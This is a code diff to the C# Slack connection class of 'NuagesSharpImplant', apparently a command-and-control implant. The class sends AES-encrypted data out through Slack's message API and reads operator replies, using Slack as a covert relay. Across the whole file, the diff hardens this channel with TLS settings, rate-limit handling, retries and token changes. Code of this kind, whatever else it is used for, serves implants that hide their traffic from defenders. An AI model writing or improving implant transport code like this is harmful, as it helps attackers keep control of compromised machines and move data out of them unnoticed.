@@ -4,6 +4,9 @@ using System.Net;
 using System.Text;
 using System.Json;
 using System.Collections.Generic;
+using System.Net.WebSockets;
+using System.Threading;
+using System.Threading.Tasks;
 using NuagesSharpImplant.Utils;
 
 namespace NuagesSharpImplant.Connections
@@ -14,8 +17,6 @@ namespace NuagesSharpImplant.Connections
     {
 
         private string handler = "SLACKAES256Connection";
-
-        private string slackAppToken;
 
         private string slackToken;
 
@@ -29,15 +30,13 @@ namespace NuagesSharpImplant.Connections
 
         public int buffersize;
 
-        public SLACKAES256Connection(string password, string channelId, string slackToken, string slackAppToken, int buffersize, int refreshrate)
+        public SLACKAES256Connection(string password, string channelId, string slackToken, int buffersize, int refreshrate)
         {
             this.aes = new AESHelper(password);
 
             this.refreshrate = refreshrate;
 
             this.buffersize = buffersize;
-
-            this.slackAppToken = slackAppToken;
 
             this.slackToken = slackToken;
 
@@ -85,69 +84,105 @@ namespace NuagesSharpImplant.Connections
         {
             return this.refreshrate;
         }
-
         string sendSlackMessage(string message, int tries = 0)
         {
-            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
-            list.Add(new KeyValuePair<string, JsonValue>("channel", this.channelId));
-            list.Add(new KeyValuePair<string, JsonValue>("text", message));
-            list.Add(new KeyValuePair<string, JsonValue>("as_user", true));
-            JsonObject body = new JsonObject(list);
-            WebRequest request = WebRequest.Create("https://slack.com/api/chat.postMessage");
-            request.Headers.Add("Authorization", "Bearer " + this.slackToken);
-            request.ContentType = "application/json";
-            request.Method = "POST";
-            byte[] byteArray = Encoding.UTF8.GetBytes(body);
-            request.ContentLength = byteArray.Length;
-            Stream dataStream = request.GetRequestStream();
-            dataStream.Write(byteArray, 0, byteArray.Length);
-            dataStream.Close();
-            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-            if ((int)response.StatusCode == 429 && tries < 3)
+            try
             {
-                System.Threading.Thread.Sleep(3000 * (tries + 1));
-                return sendSlackMessage(message, tries + 1);
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                JsonObject body = new JsonObject
+                {
+                    { "channel", this.channelId },
+                    { "text", message },
+                    { "as_user", true }
+                };
+                WebRequest request = WebRequest.Create("https://slack.com/api/chat.postMessage");
+                request.Headers.Add("Authorization", "Bearer " + this.slackToken);
+                request.ContentType = "application/json";
+                request.Method = "POST";
+                byte[] byteArray = Encoding.UTF8.GetBytes(body.ToString());
+                request.ContentLength = byteArray.Length;
+                using (Stream dataStream = request.GetRequestStream())
+                {
+                    dataStream.Write(byteArray, 0, byteArray.Length);
+                }
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                if ((int)response.StatusCode == 429)
+                {
+                    var retryAfter = response.Headers["Retry-After"];
+                    int retryDelay = retryAfter != null ? int.Parse(retryAfter) * 1000 : 3000;
+                    Thread.Sleep(retryDelay * (tries + 1));
+                    return sendSlackMessage(message, tries + 1);
+                }
+                using (Stream dataStream = response.GetResponseStream())
+                using (StreamReader reader = new StreamReader(dataStream))
+                {
+                    string responseFromServer = reader.ReadToEnd();
+                    JsonValue jsonResponse = JsonValue.Parse(responseFromServer);
+
+                    if ((int)response.StatusCode != 200 || (bool)jsonResponse["ok"] != true)
+                    {
+                        throw new Exception("Error posting Slack message: " + jsonResponse["error"]);
+                    }
+                    return jsonResponse["ts"].ToString();
+                }
             }
-            dataStream = response.GetResponseStream();
-            StreamReader reader = new StreamReader(dataStream);
-            string responseFromServer = reader.ReadToEnd();
-            JsonValue jResponse = JsonValue.Parse(responseFromServer);
-            if ((int)response.StatusCode != 200 || (bool)jResponse["ok"] != true)
-             {
-                throw new Exception("Couldnt send SLACK message");
+            catch (WebException webEx)
+            {
+                Console.WriteLine("WebException: " + webEx.Message);
+                if (tries < 3)
+                {
+                    Thread.Sleep(3000 * (tries + 1));
+                    return sendSlackMessage(message, tries + 1);
+                }
+                throw;
             }
-            string ts = jResponse["ts"].ToString();
-            return ts;
+            catch (Exception ex)
+            {
+                Console.WriteLine("Exception: " + ex.Message);
+                throw;
+            }
         }
 
         string getSlackResponse(string ts, int tries = 0)
         {
-            if (tries == 4) {
-                throw new Exception("No slack response found");
+            if (tries == 4)
+            {
+                throw new Exception("No Slack response found after 4 tries");
             }
-            string url = "https://slack.com/api/conversations.replies?";
-            url += "token=" + this.slackAppToken + "&channel=" + this.channelId + "&ts=" + ts;
+            string url = $"https://slack.com/api/conversations.replies?channel={this.channelId}&ts={ts}";
             WebRequest request = WebRequest.Create(url);
             request.ContentType = "application/json";
             request.Headers.Add("Authorization", "Bearer " + this.slackToken);
             request.Method = "GET";
-            Stream dataStream;
-            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-            if ((int)response.StatusCode == 429)
+            try
             {
-                System.Threading.Thread.Sleep(3000 * (tries + 1));
-                return getSlackResponse(ts, tries + 1);
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                if ((int)response.StatusCode == 429)
+                {
+                    var retryAfter = response.Headers["Retry-After"];
+                    int retryDelay = retryAfter != null ? int.Parse(retryAfter) * 1000 : 3000;
+                    Thread.Sleep(retryDelay * (tries + 1));
+                    return getSlackResponse(ts, tries + 1);
+                }
+                using (Stream dataStream = response.GetResponseStream())
+                using (StreamReader reader = new StreamReader(dataStream))
+                {
+                    string responseFromServer = reader.ReadToEnd();
+                    JsonValue jsonResponse = JsonValue.Parse(responseFromServer);
+                    JsonArray messages = (JsonArray)jsonResponse["messages"];
+                    if (messages.Count < 2)
+                    {
+                        Thread.Sleep(1000 * (tries + 1));
+                        return getSlackResponse(ts, tries + 1);
+                    }
+                    return messages[1]["text"].ToString();
+                }
             }
-            dataStream = response.GetResponseStream();
-            StreamReader reader = new StreamReader(dataStream);
-            string responseFromServer = reader.ReadToEnd();
-            JsonValue jResponse = JsonValue.Parse(responseFromServer);
-            JsonValue messages = jResponse["messages"];
-            if (messages.Count < 2) {
-                System.Threading.Thread.Sleep(1000 * (tries + 1));
-                return getSlackResponse(ts, tries + 1);
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+                throw;
             }
-            return messages[1]["text"].ToString();
         }
 
         public byte[] POST(string url, byte[] input)
@@ -175,6 +210,7 @@ namespace NuagesSharpImplant.Connections
             }
             System.Threading.Thread.Sleep(1000);
             string nResponse = this.getSlackResponse(ts);
+            nResponse = nResponse.Trim('\"');
             return this.aes.DecryptString(Convert.FromBase64String(nResponse));
         }
     }
